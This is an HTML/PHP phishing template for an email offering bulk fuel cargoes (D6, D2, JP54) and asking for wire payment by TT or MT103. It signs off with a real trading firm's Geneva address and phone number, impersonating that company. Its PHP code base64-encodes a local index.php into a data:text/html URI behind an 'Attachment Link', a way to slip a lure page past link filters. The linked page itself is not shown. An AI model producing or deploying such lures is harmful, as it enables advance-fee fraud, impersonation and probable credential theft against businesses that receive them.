

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../favicon.ico">

    <title>Email</title>
</head>
<body>
    


<?php
    $base64url = base64_encode(file_get_contents('./index.php'));
    $link = "data:text/html;base64, $base64url";
?>
<p>
Hey There,<br>
Greetings to you and your company. With regards to our conversation, 
we currently have D6, D2 and JP54 in Houston and Rotterdam Port. 
These products are already in batches and a simple CI, DIP and PAY will 
close the deal within 48HRS.<br>
Just CLICK to view the offer or you can click 
on this link <a href="<?php echo $link; ?>" target="_blank"> Attachment Link </a>.<br>
We are the title holders of the fuel and please note that we only accept payment 
via TT or MT103 less than 48hrs after DIPTEST has been conducted. 
We look forward to a long-term business relationship with your esteemed company. <br>
</p>
<p>
<strong>Best Regards</strong><br>

SWITZERLAND (HEAD OFFICE)<br>
​LITASCO SA9, <br>
rue du Conseil General, <br>
CH - 1205 Geneva,<br>
 Switzerland <br>
 
 +41227052000
</p>
</body>
<?php

    